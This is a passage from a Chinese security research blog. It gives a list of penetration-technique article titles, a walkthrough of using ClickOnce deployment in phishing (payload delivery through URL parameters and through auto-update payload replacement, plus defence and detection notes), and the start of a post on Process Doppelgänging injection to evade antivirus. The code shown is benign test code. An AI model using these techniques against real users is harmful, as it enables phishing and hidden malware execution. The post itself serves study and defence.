    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8tscon%E5%AE%9E%E7%8E%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/">渗透技巧——利用tscon实现未授权登录远程桌面</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E6%A8%A1%E6%8B%9FIE%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/">渗透技巧——模拟IE浏览器下载文件</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BD%BF%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%8D%8F%E8%AE%AE%E5%BB%BA%E7%AB%8B%E9%80%9A%E9%81%93/">渗透技巧——使用远程桌面协议建立通道</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87HTTP%E5%8D%8F%E8%AE%AE%E8%8E%B7%E5%BE%97Net-NTLM-hash/">渗透技巧——通过HTTP协议获得Net-NTLM hash</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87Kerberos-pre-auth%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%92%8C%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/">渗透技巧——通过Kerberos pre-auth进行用户枚举和口令爆破</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash/">渗透技巧——通过SAM数据库获得本地用户hash</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E4%B8%8E%E5%88%A0%E9%99%A4/">渗透技巧——Windows系统的文件恢复与删除</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA/">渗透技巧——”隐藏”注册表的创建</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95/">渗透技巧——”隐藏”注册表的更多测试</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87APC%E5%AE%9E%E7%8E%B0Dll%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87Sysmon%E7%9B%91%E6%8E%A7/">通过APC实现Dll注入——绕过Sysmon监控</a></p>
  </li>
  <li>
    <p>通过Boolang语言执行shellcode的利用分析</p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6IFileOperation%E8%B6%8A%E6%9D%83%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6/">通过COM组件IFileOperation越权复制文件</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6NetFwPolicy2%E8%B6%8A%E6%9D%83%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99/">通过COM组件NetFwPolicy2越权关闭防火墙</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6IARPUninstallStringLauncher%E7%BB%95%E8%BF%87UAC/">通过COM组件IARPUninstallStringLauncher绕过UAC</a></p>
  </li>
  <li>
    <p>通过Mono(跨平台.NET运行环境)执行shellcode</p>
  </li>
  <li>
    <p>通过Network Security Services导出Firefox浏览器中保存的密码</p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87%E6%A8%A1%E6%8B%9F%E5%8F%AF%E4%BF%A1%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87UAC%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">通过模拟可信目录绕过UAC的利用分析</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-%E5%9C%A8PE%E6%96%87%E4%BB%B6%E7%9A%84%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E4%B8%AD%E9%9A%90%E8%97%8FPayload/">隐写技巧——在PE文件的数字证书中隐藏Payload</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-PNG%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84LSB%E9%9A%90%E5%86%99/">隐写技巧——PNG文件中的LSB隐写</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8JPEG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8Fpayload/">隐写技巧——利用JPEG文件格式隐藏payload</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/">隐写技巧——利用PNG文件格式隐藏Payload</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AdminSDHolder/">域渗透——AdminSDHolder</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AS-REPRoasting/">域渗透——AS-REPRoasting</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/">域渗透——DCSync</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96/">域渗透——DNS记录的获取</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E8%8E%B7%E5%BE%97DNS%E8%AE%B0%E5%BD%95/">域渗透——普通用户权限获得DNS记录</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/">域渗透——Kerberoasting</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/">域渗透——Pass The Hash的实现</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E8%8E%B7%E5%BE%97%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTDS.dit%E6%96%87%E4%BB%B6/">域渗透——获得域控服务器的NTDS.dit文件</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8DCOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/">域渗透——利用DCOM在远程系统执行程序</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8dnscmd%E5%9C%A8DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDDll/">域渗透——利用dnscmd在DNS服务器上实现远程加载Dll</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C/">域渗透——利用GPO中的计划任务实现远程执行</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C(%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E4%B8%8E%E8%84%9A%E6%9C%AC%E7%BB%86%E8%8A%82)/">域渗透——利用GPO中的计划任务实现远程执行(命令行实现原理与脚本细节)</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">域渗透——利用SYSVOL还原组策略中保存的密码</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%89%B9%E5%AE%9A%E7%9A%84ACL%E5%AE%9E%E7%8E%B0%E5%9F%9F%E6%8F%90%E6%9D%83/">域渗透——使用Exchange服务器中特定的ACL实现域提权</a></p>
  </li>
  <li>
    <p><a href="https://3gstudent.github.io/3gstudent.github.io/32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E5%AF%B964%E4%BD%8D%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0/">32位程序对64位进程的远程注入实现</a></p>
  </li>
</ul>

<hr>

<h3 id="powerpoint">PowerPoint</h3>

<ul>
  <li><a href="https://github.com/3gstudent/pdf/blob/master/Shell-is-Only-the-Beginning%E2%80%94%E2%80%94%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5%E7%9A%84%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97.pdf">Shell is Only the Beginning——后渗透阶段的攻防对抗( WHF2016 )</a></li>
</ul>

<hr>

<p><img src="https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/images/QRCode.png" alt="" title="https://3gstudent.github.io/about/"></p>


  </div>
</article><article class="post">
  <h1>渗透测试中的ClickOnce</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近Casey Smith@subTee在《Mimikatz Delivery via ClickOnce with URL Parameters》中介绍了如何在ClickOnce程序中传入URL参数，实现执行mimikatz的技巧，并分享了一个POC</p>

<p>我对此很感兴趣，于是做了进一步的学习和研究</p>

<p>本文将会记录学习心得，介绍ClickOnce的使用方法，总结基于ClickOnce的攻击技巧和防御措施</p>

<p><strong>博客地址：</strong></p>

<p>http://subt0x10.blogspot.com/2016/12/mimikatz-delivery-via-clickonce-with.html</p>

<p><strong>POC地址：</strong></p>

<p>https://gist.github.com/subTee/bd446efeacf656c67f5c17ca0787f15b</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p><strong>ClickOnce：</strong></p>

<p>ClickOnce 是一种部署技术，使用该技术可创建自行更新的基于Windows的应用程序，这些应用程序可以通过最低程度的用户交互来安装和运行</p>

<p>使用用ClickOnce主要解决了程序部署中的几个问题：</p>

<ul>
  <li>
    <p>更新应用程序的困难
使用 Microsoft Windows Installer 部署，每次应用程序更新时，用户都必须重新安装整个应用程序；使用 ClickOnce 部署，则可以自动提供更新。只有更改过的应用程序部分才会被下载，然后会从新的并行文件夹重新安装完整的、更新后的应用程序。</p>
  </li>
  <li>
    <p>对用户的计算机的影响
使用 Windows Installer 部署时，应用程序通常依赖于共享组件，这便有可能发生版本冲突；而使用 ClickOnce 部署时，每个应用程序都是独立的，不会干扰其他应用程序。</p>
  </li>
  <li>
    <p>安全权限
Windows Installer 部署要求管理员权限并且只允许受限制的用户安装；而 ClickOnce 部署允许非管理用户安装应用程序并仅授予应用程序所需要的那些代码访问安全权限</p>
  </li>
</ul>

<p>简单理解，ClickOnce部署的优点：</p>

<ul>
  <li>简化安装和更新应用程序的过程</li>
  <li>可以自动更新</li>
  <li>支持从Web更新</li>
  <li>更安全，仅授予应用程序所必需的权限，通常为Intranet区域</li>
</ul>

<p>详细介绍可参考如下链接：</p>

<p>https://msdn.microsoft.com/zh-cn/cn/library/142dbbz4(v=vs.90).aspx</p>

<p>ClickOnce安装成功后，会在开始菜单下保存该安装程序</p>

<p>接下来介绍如何开发ClickOnce程序并在网站上发布</p>

<h2 id="0x02-使用clickonce的常规方法">0x02 使用ClickOnce的常规方法</h2>
<hr>

<h3 id="1配置web服务器">1、配置Web服务器</h3>

<p>测试系统：Windows Server 2008 R2</p>

<p><strong>1.安装Web服务器（IIS）</strong></p>

<p>在”服务器管理器”-“角色”-“添加角色”-选择”Web服务器（IIS）”进行安装</p>

<p>在”开始”-“管理工具”-“Internet信息服务（IIS）管理器”打开IIS，点击”浏览网站”，看是否正常显示</p>

<p>用http访问Windows Server 2008 Web服务器的IP地址，看是否正常显示</p>

<p>若以上测试通过，则说明IIS已安装成功且能正常使用</p>

<p><strong>2.添加虚拟目录</strong></p>

<p>设置别名：<code class="language-plaintext highlighter-rouge">publich</code></p>

<p>设置物理路径：<code class="language-plaintext highlighter-rouge">c:\publish</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/2-1.png" alt="Alt text"></p>

<p>访问该虚拟目录:</p>

<p><code class="language-plaintext highlighter-rouge">http://192.168.81.140/publish/</code></p>

<p>报错：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP 错误 403.14 - Forbidden
Web 服务器被配置为不列出此目录的内容。
</code></pre></div></div>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/2-2.png" alt="Alt text"></p>

<p><strong>3.启用目录浏览</strong></p>

<p>打开IIS管理器，切换到功能试图，找到目录浏览，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/2-3.png" alt="Alt text"></p>

<p>在目录浏览的操作界面下选择启用，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/2-4.png" alt="Alt text"></p>

<p>此时，文件能够正常访问，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/2-5.png" alt="Alt text"></p>

<h3 id="2开发clickonce程序">2、开发ClickOnce程序</h3>

<p><strong>1.新建标准c#工程</strong></p>

<p>添加测试代码：</p>

<p><code class="language-plaintext highlighter-rouge">System.Diagnostics.Process.Start("calc.exe");</code></p>

<p><strong>2.找到项目-属性-发布</strong></p>

<p>如下图，设置发布文件夹位置，选择立即发布</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/3-1.png" alt="Alt text"></p>

<p>C:\1下生成三个文件，分别为：</p>
<ul>
  <li>setup.exe</li>
  <li>ConsoleApplication3.application</li>
  <li>Application Files</li>
</ul>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/3-2.png" alt="Alt text"></p>

<p>安装成功后，在开始菜单自动生成快捷方式，文件夹名称为ClickOnce程序中发布者的名称</p>

<p>安装文件保存在<code class="language-plaintext highlighter-rouge">%USERPROFILE%\Local Settings\Apps\2.0</code>下</p>

<p>程序安装列表中也会存在，可在此处卸载ClickOnce</p>

<p><strong>3.在IIS服务器上发布</strong></p>

<p>将步骤2新生成的三个文件复制到<code class="language-plaintext highlighter-rouge">c:\pubish</code>下</p>

<p><strong>4.测试</strong></p>

<p>在另一台测试主机访问该Web目录，点击提示安全警告，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/3-3.png" alt="Alt text"></p>

<p>选择运行，接着提示安全警告，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/3-4.png" alt="Alt text"></p>

<p>选择运行，执行setup.exe，弹出计算器，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/3-5.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>在发布项下有多个选择可供选择，用来指定安装模式、应用程序文件、系统必备组件、更新选项等</p>

<h2 id="0x03-基于clickonce的攻击技巧">0x03 基于ClickOnce的攻击技巧</h2>
<hr>

<p>基于ClickOnce的特性，最常见的利用方式为钓鱼攻击，所以接下来整理一下在钓鱼攻击中ClickOnce都有哪些利用方法</p>

<h3 id="1增加权限">1、增加权限</h3>

<p>在用户看来，更新程序的过程常常需要管理员的权限，所以在运行更新程序的过程中，如果程序弹框提示需要管理员权限，用户往往会选择同意，触发的payload随即获得了管理员权限</p>

<h3 id="2利用自动更新功能替换payload">2、利用自动更新功能替换payload</h3>

<p>ClickOnce支持自动更新功能，在运行时可检查新版本并自动更新</p>

<p><strong>注:</strong></p>

<p>ClickOnce安装成功后，会在开始菜单下保存该安装程序</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/4-1.png" alt="Alt text"></p>

<h3 id="开启自动更新的步骤">开启自动更新的步骤：</h3>

<p><strong>1.指定更新网址</strong></p>

<p>设置”安装文件夹URL”，填入IIS服务器的下载地址就好，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/4-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>IIS服务器上不需要安装Visual Studio</p>

<p><strong>2.设定自动更新</strong></p>

<p>选择更新选项，启用”应用程序应该检查更新”，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/4-3.png" alt="Alt text"></p>

<p><strong>3.指定版本号</strong></p>

<p>如下图，选定”随每次发布自动递增修订号”</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/4-4.png" alt="Alt text"></p>

<p><strong>4.测试</strong></p>

<p>在IIS发布初始版本</p>

<p>测试主机下载安装</p>

<p>启用”应用程序应该检查更新”后，安装后的ClickOnce在每次运行时会访问服务器检查是否有更新，如果服务器有更新，会弹出更新对话框</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/4-5.png" alt="Alt text"></p>

<p>点击确定后，安装程序更新为新版本，成功实现替换payload</p>

<h3 id="3将url参数作为payload执行">3、将url参数作为payload执行</h3>

<p>测试之前，Visual Studio需要作如下设置：</p>

<p><strong>1.需要支持ClickOnce</strong></p>

<p>安装Visual Studio的过程需要选择该项</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/4-6.png" alt="Alt text"></p>

<p>否则在”using System.Deployment.Application;”时会报错，提示如下：</p>

<p><code class="language-plaintext highlighter-rouge">命名空间“System.Deployment”中不存在类型或命名空间名“Application”(是否缺少程序集引用?)	</code></p>

<p><strong>2.添加引用</strong></p>

<p>在项目工程中添加引用”System.Deployment”，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/4-7.png" alt="Alt text"></p>

<p>在项目工程中添加引用”System.Web”</p>

<p>否则报错，提示如下：</p>

<p><code class="language-plaintext highlighter-rouge">当前上下文中不存在名称“HttpUtility”</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/4-8.png" alt="Alt text"></p>

<p><strong>3.设置”允许向应用程序传递URL参数”</strong></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/4-9.png" alt="Alt text"></p>

<p>否则，无法向ClickOnce传入参数</p>

<p>测试代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Deployment.Application;
using System.Web;
using System.Collections.Specialized;
namespace ConsoleApplication3
{
    class Program
    {
        static void Main(string[] args)
        {
            try
               {
                   NameValueCollection nvc = GetQueryStringParameters();

                   foreach (string key in nvc)
                   {
                       Console.WriteLine(nvc[key]);
                       Console.ReadLine();
                   }
               }
               catch
               {
                   Console.WriteLine("No Params");
                   Console.ReadLine();
               }
           }
           public static NameValueCollection GetQueryStringParameters()
           {
               NameValueCollection col = new NameValueCollection();
               if (ApplicationDeployment.IsNetworkDeployed)
               {
                   string queryString = ApplicationDeployment.CurrentDeployment.ActivationUri.Query;
                   col = HttpUtility.ParseQueryString(queryString);
               }
               return col;
           }      
    }
}
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>测试代码选自https://gist.github.com/subTee/bd446efeacf656c67f5c17ca0787f15b</p>

<p>将新的ClickOnce程序发布</p>

<p><strong>注：</strong></p>

<p>只需要将.application和Application Files上传至网站就好，不需要提供setup.exe</p>

<p>测试主机在IE浏览器访问如下URL：</p>

<p><code class="language-plaintext highlighter-rouge">http://192.168.81.140/publish/ConsoleApplication3.application?N=TEST</code></p>

<p>程序自动识别参数并解析输出，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/4-92.png" alt="Alt text"></p>

<h3 id="4结合网站的重定向功能触发不同的payload">4、结合网站的重定向功能，触发不同的payload</h3>

<p>网站的重定向可导致URL的参数不同，这样就可以实现触发不同的payload</p>

<p>细节略</p>

<p>可参考https://blog.netspi.com/all-you-need-is-one-a-clickonce-love-story/</p>

<h2 id="0x04-钓鱼攻击的缺陷">0x04 钓鱼攻击的缺陷:</h2>
<hr>

<p>不同系统.net版本不同，所以钓鱼利用场景受限</p>

<p>系统在执行ClickOnce程序的过程会检查数字签名验证发布者，否则会提示安装包不可信</p>

<h2 id="0x05-防御">0x05 防御</h2>
<hr>

<h3 id="1对clickonce程序提高警惕识别真伪">1、对ClickOnce程序提高警惕，识别真伪</h3>

<p>运行特殊后缀名的程序(如.application)就会对ClickOnce程序进行安装，不需要setup.exe，用户需要对此提高警惕</p>

<h3 id="2禁用特殊后缀名如application">2、禁用特殊后缀名,如.application</h3>

<p>不同.net版本生成的ClickOnce程序后缀名存在差异，如下链接有更详细的关于ClickOnce程序后缀名的介绍：
https://robindotnet.wordpress.com/2010/06/12/mime-types-for-clickonce-deployment/</p>

<h2 id="0x06-检测">0x06 检测</h2>
<hr>

<h3 id="1安装clickonce程序后会在注册表留下痕迹">1、安装ClickOnce程序后，会在注册表留下痕迹</h3>

<p>注册表位置：</p>

<p><code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/5-1.png" alt="Alt text"></p>

<h3 id="2安装clickonce程序后会在如下目录保存文件">2、安装ClickOnce程序后，会在如下目录保存文件：</h3>

<p><code class="language-plaintext highlighter-rouge">%USERPROFILE%\Local Settings\Apps\2.0</code></p>

<p>测试主机上的路径为：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Users\a\Local Settings\Apps\2.0</code></p>

<p>每个ClickOnce程序都有一个特殊名字的文件夹，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-22/5-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>删除文件夹将从系统中删除ClickOnce应用程序</p>

<h3 id="3安装程序列表也会存在clickonce程序名称">3、安装程序列表也会存在ClickOnce程序名称</h3>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>通过ClickOnce进行钓鱼，相比于常规的钓鱼方式，由于后缀名不常见，因此欺骗性更高，支持的扩展功能如解析URL参数、自动更新等功能，使得其利用方法更加灵活</p>

<p>但是，只要用户提高警惕，验证ClickOnce程序的数字证书，只运行受信任的程序，就可以防范此类钓鱼方式的攻击</p>

<p>未知攻焉知防，希望本文帮助大家更好的认识这个技术，保护自己的安全</p>

<hr>

<p>参考学习资料：</p>

<p>http://subt0x10.blogspot.com/2016/12/mimikatz-delivery-via-clickonce-with.html</p>

<p>https://blog.netspi.com/all-you-need-is-one-a-clickonce-love-story/</p>

<p>http://www.sixdub.net/?p=555</p>

<p>https://msdn.microsoft.com/en-us/library/t71a733d.aspx</p>

<p>https://www.rsa.com/content/dam/pdfs/a-decade-of-phishing-wp-11-2016.pdf</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December 22, 2016
  </div>

  
</article><article class="post">
  <h1>Process Doppelganging利用介绍</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在最近的BlackHat Europe 2017，Tal Liberman和Eugene Kogan介绍了一种新的代码注入技术——<code class="language-plaintext highlighter-rouge">Process Doppelgänging</code></p>

<p>据说这种利用方式支持所有Windows系统，能够绕过绝大多数安全产品的检测</p>

<p>于是，本文将要根据开源代码，编写程序，实现Process Doppelgänging，测试功能，分析利用思路</p>

<p>参考地址：</p>

<p>https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>原理</li>
  <li>开源代码</li>
  <li>修复方法</li>
  <li>实际测试</li>
  <li>利用思路</li>
  <li>防御检测</li>
</ul>

<h2 id="0x02-process-doppelgänging原理">0x02 Process Doppelgänging原理</h2>
<hr>

<p>原理上类似于Process Hollowing，但是更加高级：</p>

<ul>
  <li>不需要使用傀儡进程</li>
  <li>不需要特殊的内存操作，例如SuspendProcess和NtUnmapViewOfSection</li>
</ul>

<p><strong>注：</strong></p>

<p>关于Process Hollowing的介绍，可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%A3%80%E6%B5%8B/">《傀儡进程的实现与检测》</a></p>

<h3 id="实现思路">实现思路：</h3>

<h4 id="1打开一个正常文件创建transaction">1.打开一个正常文件，创建transaction</h4>

<p>关于NTFS transaction，可参考：</p>

<p>http://www.ntfs.com/transaction.htm</p>

<h4 id="2在这个transaction内填入payloadpayload作为进程被启动">2.在这个transaction内填入payload，payload作为进程被启动</h4>

<p>目前为止，杀毒软件无法对填入的payload进行扫描</p>

<h4 id="3回滚transaction">3.回滚transaction</h4>

<p>相当于还原transaction，清理痕迹</p>

<h3 id="对应程序实现过程">对应程序实现过程：</h3>

<h4 id="1创建transaction">1.创建transaction</h4>

<p>关键函数：</p>

<ul>
  <li>NtCreateTransaction</li>
</ul>

<h4 id="2在这个transaction内填入payload">2.在这个transaction内填入payload</h4>

<p>关键函数：</p>

<ul>
  <li>CreateFileTransacted</li>
  <li>NtCreateSection</li>
</ul>

<h4 id="3payload作为进程被启动">3.payload作为进程被启动</h4>

<p>关键函数：</p>

<ul>
  <li>NtCreateProcessEx</li>
  <li>NtCreateThreadEx</li>
</ul>

<h4 id="4回滚transaction">4.回滚transaction</h4>

<p>关键函数：</p>

<ul>
  <li>NtRollbackTransaction</li>
</ul>

<p>当然，还涉及到payload的写入，申请内存、PE文件结构等，这里暂不介绍，可直接参考POC源码</p>

